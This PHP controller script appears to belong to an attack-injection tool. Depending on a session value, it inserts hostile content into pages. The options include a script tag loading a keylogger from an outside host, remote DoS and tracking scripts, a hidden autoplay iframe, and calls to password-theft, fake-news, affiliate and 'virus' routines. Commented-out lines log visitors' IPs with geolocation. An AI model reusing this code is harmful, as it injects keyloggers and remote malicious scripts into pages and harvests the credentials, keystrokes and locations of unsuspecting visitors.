<?php
session_start();
include "../php/BaseController.php";
$typeOfAttack = (string)$_SESSION['Type'];
$privateKey = $_SESSION['privateKey'];
$textToInsert="";
switch($typeOfAttack){
    case "Key":
          $keyloggerscript = "http://stme.esy.es/js/keylogger.js";
          $textToInsert="<script type='text/javascript' src='$keyloggerscript'</script>";
          //GETTING IP AND ADDING IT TO DATA.TXT ON SERVER
//          $ip = getenv('HTTP_CLIENT_IP')?:
//          getenv('HTTP_X_FORWARDED_FOR')?:
//          getenv('HTTP_X_FORWARDED')?:
//          getenv('HTTP_FORWARDED_FOR')?:
//          getenv('HTTP_FORWARDED')?:
//          getenv('REMOTE_ADDR');
          //depends on location / this ip for good result 12.215.42.19 ;
//           $data = file_get_contents("http://api.hostip.info/get_html.php?ip='$ip'&position=true")." Says <br>";
//           $logfile = fopen('../php/data.txt', 'a+');
//           fwrite($logfile, $data );
//           fclose($logfile);
          runScript($textToInsert);
          break;
    case "Dos":
          $stringIp = $_SERVER['REMOTE_ADDR'];
          $link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

         // $ip = ip2long($stringIp);
          $DosScript = "http://stme.esy.es/js/dos.js";
          $textToInsert="<script type='text/javascript' src='$DosScript'></script>";
          //for($i=0;$i<10;i++){$textToInsert .= $textToInsert};
          runDosScript($textToInsert , $stringIp ,$link);
          break;
        
    case "RickRoll":
        
          $textToInsert="<iframe width='0' height='0' src='https://www.youtube.com/embed/oHg5SJYRHA0?rel=0&autoplay=1' frameborder='0'></iframe>";
          runScript($textToInsert);
          break;

    case "Cryptography":
          runCryptographyScript($privateKey);
          break;

    case "Tracking":
          $TrackingScript = "http://stme.esy.es/js/tracking.js";
          $textToInsert="<script type='text/javascript' src='$TrackingScript'></script>";
          runScript($textToInsert);
          break;
    case "Password":
          runPasswordScript();
          break;
        
    case "Affliate":
        runAffliateScript();
        break;
        
    case "Fake News":
        runBbcScript();
        break;
        
    case "Virus":
        runVirusScript();
        break;

    default:
          
          runIframeScript();
          break;
}


?>
